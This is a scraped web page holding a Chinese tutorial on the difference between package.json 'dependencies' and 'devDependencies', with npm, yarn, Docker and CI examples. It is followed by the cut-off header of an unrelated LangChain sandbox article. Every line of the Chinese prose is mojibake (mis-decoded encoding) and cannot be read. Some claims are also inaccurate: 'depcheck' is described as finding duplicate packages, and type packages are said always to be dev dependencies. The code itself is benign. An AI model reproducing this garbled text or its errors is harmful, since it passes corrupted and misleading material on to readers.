                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">æ ¸å¿ƒåŒºåˆ«æ¦‚è¿°</h2>
<p>åœ¨ Node.js å’Œå‰ç«¯é¡¹ç›®ä¸­ï¼Œ<code>package.json</code> æ–‡ä»¶æ˜¯é¡¹ç›®çš„"èº«ä»½è¯"å’Œ"é…ç½®æ¸…å•"ï¼Œå…¶ä¸­çš„ <code>dependencies</code>ï¼ˆç”Ÿäº§ä¾èµ–ï¼‰å’Œ <code>devDependencies</code>ï¼ˆå¼€å‘ä¾èµ–ï¼‰æ˜¯ç®¡ç†é¡¹ç›®ä¾èµ–çš„ä¸¤å¤§æ ¸å¿ƒå­—æ®µã€‚å®ƒä»¬è™½ç„¶éƒ½ç”¨æ¥å£°æ˜é¡¹ç›®æ‰€éœ€çš„è½¯ä»¶åŒ…ï¼Œä½†åœ¨ä½¿ç”¨åœºæ™¯ã€å®‰è£…æ–¹å¼å’Œéƒ¨ç½²ç­–ç•¥ä¸Šæœ‰ç€æœ¬è´¨åŒºåˆ«ã€‚</p>
<h2 data-id="heading-1">ğŸ“¦ dependenciesï¼šç”Ÿäº§ç¯å¢ƒä¾èµ–</h2>
<h3 data-id="heading-2">å®šä¹‰ä¸ä½œç”¨</h3>
<p><code>dependencies</code> åŒ…å«äº†é¡¹ç›®åœ¨ç”Ÿäº§ç¯å¢ƒä¸­è¿è¡Œæ‰€å¿…éœ€çš„ä¾èµ–åŒ…ã€‚è¿™äº›æ˜¯é¡¹ç›®ä»£ç <strong>è¿è¡Œæ—¶çœŸæ­£éœ€è¦</strong>çš„åº“å’Œæ¡†æ¶ã€‚</p>
<h3 data-id="heading-3">å…¸å‹åŒ…å«å†…å®¹</h3>
<ul>
<li>
<p><strong>è¿è¡Œæ—¶åº“</strong>ï¼šå¦‚ Reactã€Vueã€Angular ç­‰å‰ç«¯æ¡†æ¶</p>
</li>
<li>
<p><strong>å·¥å…·åº“</strong>ï¼šå¦‚ lodashã€axiosã€moment ç­‰é€šç”¨å·¥å…·</p>
</li>
<li>
<p><strong>æœåŠ¡ç«¯æ¡†æ¶</strong>ï¼šå¦‚ Expressã€Koaã€NestJS</p>
</li>
<li>
<p><strong>æ•°æ®åº“é©±åŠ¨</strong>ï¼šå¦‚ mongooseã€sequelizeã€mysql2</p>
</li>
<li>
<p><strong>å…¶ä»–æ ¸å¿ƒä¾èµ–</strong>ï¼šä»»ä½•é¡¹ç›®è¿è¡Œä¸å¯æˆ–ç¼ºçš„ç¬¬ä¸‰æ–¹åŒ…</p>
</li>
</ul>
<h3 data-id="heading-4">å®‰è£…ä¸ä½¿ç”¨</h3>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-comment"># å®‰è£…åˆ° dependencies</span>
npm install &lt;<span class="hljs-keyword">package</span>-name&gt; --save
<span class="hljs-comment"># æˆ–ç®€å†™</span>
npm install &lt;<span class="hljs-keyword">package</span>-name&gt;
<span class="hljs-comment"># yarn ç­‰ä»·å‘½ä»¤</span>
yarn add &lt;<span class="hljs-keyword">package</span>-name&gt;
</code></pre>
<h3 data-id="heading-5">éƒ¨ç½²å½±å“</h3>
<p>è¿™äº›ä¾èµ–<strong>ä¼šè¢«æ‰“åŒ…</strong>å¹¶éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒï¼Œç”¨æˆ·æœ€ç»ˆä¸‹è½½çš„ä»£ç åŒ…ä¸­åŒ…å«è¿™äº›ä¾èµ–ã€‚</p>
<h2 data-id="heading-6">ğŸ”§ devDependenciesï¼šå¼€å‘ç¯å¢ƒä¾èµ–</h2>
<h3 data-id="heading-7">å®šä¹‰ä¸ä½œç”¨</h3>
<p><code>devDependencies</code> åŒ…å«äº†ä»…åœ¨å¼€å‘ã€æ„å»ºã€æµ‹è¯•ç­‰é˜¶æ®µéœ€è¦çš„å·¥å…·å’Œåº“ã€‚é¡¹ç›®<strong>è¿è¡Œæ—¶å¹¶ä¸éœ€è¦</strong>è¿™äº›ä¾èµ–ã€‚</p>
<h3 data-id="heading-8">å…¸å‹åŒ…å«å†…å®¹</h3>
<ul>
<li>
<p><strong>æ„å»ºå·¥å…·</strong>ï¼šWebpackã€Viteã€Rollup</p>
</li>
<li>
<p><strong>ä»£ç è´¨é‡å·¥å…·</strong>ï¼šESLintã€Prettierã€Stylelint</p>
</li>
<li>
<p><strong>æµ‹è¯•æ¡†æ¶</strong>ï¼šJestã€Mochaã€Cypress</p>
</li>
<li>
<p><strong>ç±»å‹æ£€æŸ¥</strong>ï¼šTypeScriptã€Flow</p>
</li>
<li>
<p><strong>å¼€å‘æœåŠ¡å™¨</strong>ï¼šnodemonã€webpack-dev-server</p>
</li>
<li>
<p><strong>æ–‡æ¡£å·¥å…·</strong>ï¼šJSDocã€VuePress</p>
</li>
<li>
<p><strong>å…¶ä»–å¼€å‘å·¥å…·</strong>ï¼šå¦‚ä»£ç ç”Ÿæˆå™¨ã€æ„å»ºè„šæœ¬ç­‰</p>
</li>
</ul>
<h3 data-id="heading-9">å®‰è£…ä¸ä½¿ç”¨</h3>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-comment"># å®‰è£…åˆ° devDependencies</span>
npm install &lt;<span class="hljs-keyword">package</span>-name&gt; --save-dev
<span class="hljs-comment"># ç®€å†™</span>
npm install &lt;<span class="hljs-keyword">package</span>-name&gt; -D
<span class="hljs-comment"># yarn ç­‰ä»·å‘½ä»¤</span>
yarn add &lt;<span class="hljs-keyword">package</span>-name&gt; --dev
</code></pre>
<h3 data-id="heading-10">éƒ¨ç½²å½±å“</h3>
<p>è¿™äº›ä¾èµ–<strong>ä¸ä¼šè¢«æ‰“åŒ…</strong>åˆ°ç”Ÿäº§ç¯å¢ƒï¼Œæœ€ç»ˆç”¨æˆ·ä¸ä¼šä¸‹è½½è¿™äº›ä»£ç ï¼Œå‡å°‘äº†ç”Ÿäº§åŒ…ä½“ç§¯ã€‚</p>
<h2 data-id="heading-11">ğŸ” è¯¦ç»†å¯¹æ¯”è¡¨æ ¼</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d6a377572ce24ed28a7019b6f3e0a498~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn55-l6Zey6ZeyaQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768470165&amp;x-signature=UQHSX3YNz7ldt61b0AvVWZTTIuc%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-12">ğŸ› ï¸ ä½¿ç”¨åœºæ™¯ç¤ºä¾‹</h2>
<h3 data-id="heading-13">package.json ç¤ºä¾‹</h3>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"my-project"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"version"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"1.0.0"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"dependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"vue"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^3.2.0"</span><span class="hljs-punctuation">,</span>          <span class="hljs-comment">// è¿è¡Œæ—¶å¿…éœ€</span>
    <span class="hljs-attr">"axios"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^1.3.0"</span><span class="hljs-punctuation">,</span>        <span class="hljs-comment">// HTTP è¯·æ±‚åº“</span>
    <span class="hljs-attr">"vue-router"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^4.1.0"</span><span class="hljs-punctuation">,</span>   <span class="hljs-comment">// è·¯ç”±ç®¡ç†</span>
    <span class="hljs-attr">"pinia"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^2.0.0"</span>         <span class="hljs-comment">// çŠ¶æ€ç®¡ç†</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"devDependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"vite"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^4.0.0"</span><span class="hljs-punctuation">,</span>         <span class="hljs-comment">// æ„å»ºå·¥å…·</span>
    <span class="hljs-attr">"eslint"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^8.0.0"</span><span class="hljs-punctuation">,</span>       <span class="hljs-comment">// ä»£ç æ£€æŸ¥</span>
    <span class="hljs-attr">"jest"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^29.0.0"</span><span class="hljs-punctuation">,</span>        <span class="hljs-comment">// æµ‹è¯•æ¡†æ¶</span>
    <span class="hljs-attr">"prettier"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^2.0.0"</span><span class="hljs-punctuation">,</span>     <span class="hljs-comment">// ä»£ç æ ¼å¼åŒ–</span>
    <span class="hljs-attr">"@types/node"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^18.0.0"</span>  <span class="hljs-comment">// TypeScript ç±»å‹å®šä¹‰</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-14">ä¸åŒç¯å¢ƒçš„å®‰è£…ç­–ç•¥</h3>
<p><strong>å¼€å‘ç¯å¢ƒå®‰è£…æ‰€æœ‰ä¾èµ–ï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å®‰è£…æ‰€æœ‰ä¾èµ–ï¼ˆåŒ…æ‹¬ devDependenciesï¼‰</span>
npm install
<span class="hljs-comment"># æˆ–</span>
yarn install
</code></pre>
<p><strong>ç”Ÿäº§ç¯å¢ƒä»…å®‰è£… dependenciesï¼š</strong></p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># è·³è¿‡ devDependencies</span>
npm install --production
<span class="hljs-comment"># æˆ–è®¾ç½®ç¯å¢ƒå˜é‡</span>
<span class="hljs-attr">NODE_ENV</span>=production npm install
â€‹
<span class="hljs-comment"># Dockerfile ä¸­çš„å…¸å‹ç”¨æ³•</span>
COPY package*.json ./
RUN npm ci <span class="hljs-attr">--only</span>=production
</code></pre>
<p><strong>CI/CD æµæ°´çº¿ä¼˜åŒ–ï¼š</strong></p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># GitHub Actions ç¤ºä¾‹</span>
<span class="hljs-attr">jobs:</span>
  <span class="hljs-attr">test:</span>
    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-latest</span>
    <span class="hljs-attr">steps:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@v3</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/setup-node@v3</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">run:</span> <span class="hljs-string">npm</span> <span class="hljs-string">ci</span>              <span class="hljs-comment"># å®‰è£…æ‰€æœ‰ä¾èµ–ç”¨äºæµ‹è¯•</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">run:</span> <span class="hljs-string">npm</span> <span class="hljs-string">test</span>
<span class="hljs-string">â€‹</span>
  <span class="hljs-attr">deploy:</span>
    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-latest</span>
    <span class="hljs-attr">steps:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@v3</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/setup-node@v3</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">run:</span> <span class="hljs-string">npm</span> <span class="hljs-string">ci</span> <span class="hljs-string">--production</span> <span class="hljs-comment"># ä»…å®‰è£…ç”Ÿäº§ä¾èµ–</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">run:</span> <span class="hljs-string">npm</span> <span class="hljs-string">run</span> <span class="hljs-string">build</span>
</code></pre>
<h2 data-id="heading-15">âš ï¸ å¸¸è§è¯¯åŒºä¸æœ€ä½³å®è·µ</h2>
<h3 data-id="heading-16">è¯¯åŒº 1ï¼šéšæ„æ”¾ç½®ä¾èµ–</h3>
<pre><code class="hljs language-json" lang="json"><span class="hljs-comment">// âŒ é”™è¯¯ï¼šå°†æ„å»ºå·¥å…·æ”¾åœ¨ dependencies</span>
<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"dependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"webpack"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^5.0.0"</span>  <span class="hljs-comment">// é”™è¯¯ï¼è¿™åº”è¯¥æ˜¯ devDependency</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
â€‹
<span class="hljs-comment">// âœ… æ­£ç¡®</span>
<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"devDependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"webpack"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^5.0.0"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-17">è¯¯åŒº 2ï¼šç±»å‹å®šä¹‰åŒ…æ”¾ç½®é”™è¯¯</h3>
<pre><code class="hljs language-json" lang="json"><span class="hljs-comment">// å¯¹äº TypeScript é¡¹ç›®ï¼š</span>
<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"dependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"express"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^4.18.0"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"devDependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"@types/express"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^4.17.0"</span>  <span class="hljs-comment">// ç±»å‹å®šä¹‰æ°¸è¿œæ˜¯ devDependency</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-18">æœ€ä½³å®è·µ</h3>
<ol>
<li>
<p><strong>ä¸¥æ ¼åŒºåˆ†</strong>ï¼šè¿è¡Œæ—¶å¿…éœ€çš„æ”¾ <code>dependencies</code>ï¼Œå¼€å‘å·¥å…·æ”¾ <code>devDependencies</code></p>
</li>
<li>
<p><strong>å®šæœŸå®¡è®¡</strong>ï¼šä½¿ç”¨ <code>npm audit</code> æ£€æŸ¥å®‰å…¨æ¼æ´</p>
</li>
<li>
<p><strong>ç‰ˆæœ¬æ§åˆ¶</strong>ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"dependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"vue"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^3.2.0"</span><span class="hljs-punctuation">,</span>   <span class="hljs-comment">// å…¼å®¹æ€§æ›´æ–°</span>
    <span class="hljs-attr">"axios"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"~1.3.0"</span>  <span class="hljs-comment">// å°ç‰ˆæœ¬æ›´æ–°</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
</li>
<li>
<p><strong>ä¾èµ–æ¸…ç†</strong>ï¼šå®šæœŸåˆ é™¤æœªä½¿ç”¨çš„ä¾èµ–</p>
<pre><code class="hljs language-go" lang="go">npm uninstall &lt;unused-<span class="hljs-keyword">package</span>&gt;
</code></pre>
</li>
</ol>
<h2 data-id="heading-19">ğŸ”¬ é«˜çº§æŠ€å·§</h2>
<h3 data-id="heading-20">æŸ¥çœ‹ä¾èµ–æ ‘</h3>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># æŸ¥çœ‹ dependencies ä¾èµ–æ ‘</span>
npm list <span class="hljs-attr">--depth</span>=<span class="hljs-number">0</span>
â€‹
<span class="hljs-comment"># ä»…æŸ¥çœ‹ devDependencies</span>
npm list --dev <span class="hljs-attr">--depth</span>=<span class="hljs-number">0</span>
â€‹
<span class="hljs-comment"># å›¾å½¢åŒ–æ˜¾ç¤º</span>
npm list <span class="hljs-attr">--depth</span>=<span class="hljs-number">0</span> --json | npx dependency-tree
</code></pre>
<h3 data-id="heading-21">ä¾èµ–åˆ†æå·¥å…·</h3>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-comment"># åˆ†æåŒ…å¤§å°</span>
npx source-<span class="hljs-keyword">map</span>-explorer dist/*.js
â€‹
<span class="hljs-comment"># æŸ¥çœ‹é‡å¤ä¾èµ–</span>
npx depcheck
â€‹
<span class="hljs-comment"># å¯è§†åŒ–ä¾èµ–</span>
npx npm-gui
</code></pre>
<h3 data-id="heading-22">package-lock.json ä¸ yarn.lock</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ç¡®ä¿ä¾èµ–ä¸€è‡´æ€§</span>
npm ci  <span class="hljs-comment"># ä½¿ç”¨ package-lock.json ç²¾ç¡®å®‰è£…</span>
yarn install --frozen-lockfile
</code></pre>
<h2 data-id="heading-23">ğŸ“Š å®é™…æ¡ˆä¾‹åˆ†æ</h2>
<h3 data-id="heading-24">æ¡ˆä¾‹ 1ï¼šå‰åç«¯åˆ†ç¦»é¡¹ç›®</h3>
<pre><code class="hljs language-perl" lang="perl">// frontend/package.json
{
  <span class="hljs-string">"dependencies"</span>: {
    <span class="hljs-string">"react"</span>: <span class="hljs-string">"^18.2.0"</span>,
    <span class="hljs-string">"react-dom"</span>: <span class="hljs-string">"^18.2.0"</span>,
    <span class="hljs-string">"antd"</span>: <span class="hljs-string">"^5.0.0"</span>,
    <span class="hljs-string">"react-router-dom"</span>: <span class="hljs-string">"^6.8.0"</span>
  },
  <span class="hljs-string">"devDependencies"</span>: {
    <span class="hljs-string">"@vitejs/plugin-react"</span>: <span class="hljs-string">"^3.0.0"</span>,
    <span class="hljs-string">"typescript"</span>: <span class="hljs-string">"^5.0.0"</span>,
    <span class="hljs-string">"@types/react"</span>: <span class="hljs-string">"^18.0.0"</span>,
    <span class="hljs-string">"jest"</span>: <span class="hljs-string">"^29.0.0"</span>
  }
}
â€‹
// backend/package.json  
{
  <span class="hljs-string">"dependencies"</span>: {
    <span class="hljs-string">"express"</span>: <span class="hljs-string">"^4.18.0"</span>,
    <span class="hljs-string">"mongoose"</span>: <span class="hljs-string">"^7.0.0"</span>,
    <span class="hljs-string">"jsonwebtoken"</span>: <span class="hljs-string">"^9.0.0"</span>
  },
  <span class="hljs-string">"devDependencies"</span>: {
    <span class="hljs-string">"nodemon"</span>: <span class="hljs-string">"^2.0.0"</span>,
    <span class="hljs-string">"@types/express"</span>: <span class="hljs-string">"^4.17.0"</span>,
    <span class="hljs-string">"jest"</span>: <span class="hljs-string">"^29.0.0"</span>
  }
}
</code></pre>
<h3 data-id="heading-25">æ¡ˆä¾‹ 2ï¼šMonorepo é¡¹ç›®</h3>
<pre><code class="hljs language-json" lang="json"><span class="hljs-comment">// package.json (æ ¹ç›®å½•)</span>
<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"private"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"workspaces"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"packages/*"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"devDependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"lerna"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^6.0.0"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"typescript"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^5.0.0"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"jest"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^29.0.0"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
â€‹
<span class="hljs-comment">// packages/web-app/package.json</span>
<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"dependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"shared-utils"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"*"</span>  <span class="hljs-comment">// å·¥ä½œåŒºå†…å¼•ç”¨</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"devDependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"vite"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^4.0.0"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h2 data-id="heading-26">Â æ€»ç»“è¦ç‚¹</h2>
<ol>
<li>
<p><strong>æ ¸å¿ƒåŒºåˆ«</strong>ï¼š<code>dependencies</code> ç”¨äºç”Ÿäº§è¿è¡Œï¼Œ<code>devDependencies</code> ç”¨äºå¼€å‘æ„å»º</p>
</li>
<li>
<p><strong>éƒ¨ç½²ç­–ç•¥</strong>ï¼šç”Ÿäº§ç¯å¢ƒè·³è¿‡ <code>devDependencies</code> å®‰è£…ä»¥ä¼˜åŒ–éƒ¨ç½²</p>
</li>
<li>
<p><strong>æ€§èƒ½å½±å“</strong>ï¼šæ­£ç¡®åˆ†ç±»å¯ä»¥å‡å°‘ç”Ÿäº§åŒ…ä½“ç§¯ï¼ŒåŠ å¿«å®‰è£…é€Ÿåº¦</p>
</li>
<li>
<p><strong>å›¢é˜Ÿåä½œ</strong>ï¼šæ˜ç¡®çš„ä¾èµ–åˆ†ç±»æœ‰åŠ©äºå›¢é˜Ÿç†è§£å’Œç»´æŠ¤é¡¹ç›®</p>
</li>
<li>
<p><strong>å®‰å…¨æ€§</strong>ï¼šå®šæœŸå®¡è®¡å’Œæ›´æ–°ä¾èµ–ï¼Œç‰¹åˆ«æ˜¯ç”Ÿäº§ä¾èµ–</p>
</li>
</ol>
<p>è®°ä½ä¸€ä¸ªç®€å•çš„åŸåˆ™ï¼š<strong>å¦‚æœç”¨æˆ·è¿è¡Œä½ çš„åº”ç”¨æ—¶éœ€è¦è¿™ä¸ªåŒ…ï¼Œå®ƒå°±æ˜¯ dependencyï¼›å¦‚æœåªæœ‰å¼€å‘è€…åœ¨ç¼–å†™ã€æµ‹è¯•ã€æ„å»ºæ—¶éœ€è¦ï¼Œå®ƒå°±æ˜¯ devDependencyã€‚</strong> æ­£ç¡®ä½¿ç”¨è¿™ä¸¤ä¸ªå­—æ®µï¼Œèƒ½è®©ä½ çš„é¡¹ç›®æ›´åŠ ä¸“ä¸šã€é«˜æ•ˆå’Œå¯ç»´æŠ¤ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¿«é€Ÿä¸Šæ‰‹ï¼šLangChain + AgentRun æµè§ˆå™¨æ²™ç®±æç®€é›†æˆæŒ‡å—]]></title>    <link>https://juejin.cn/post/7592710766010597386</link>    <guid>https://juejin.cn/post/7592710766010597386</guid>    <pubDate>2026-01-08T09:40:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592710766010597386" data-draft-id="7592765004807929907" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¿«é€Ÿä¸Šæ‰‹ï¼šLangChain + AgentRun æµè§ˆå™¨æ²™ç®±æç®€é›†æˆæŒ‡å—"/> <meta itemprop="keywords" content="Serverless"/> <meta itemprop="datePublished" content="2026-01-08T09:40:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Serverlessç¤¾åŒº"/> <meta itemprop="url" content="https://juejin.cn/user/1794004139382301"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¿«é€Ÿä¸Šæ‰‹ï¼šLangChain + AgentRun æµè§ˆå™¨æ²™ç®±æç®€é›†æˆæŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1794004139382301/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Serverlessç¤¾åŒº
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T09:40:18.000Z" title="Thu Jan 08 2026 09:40:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
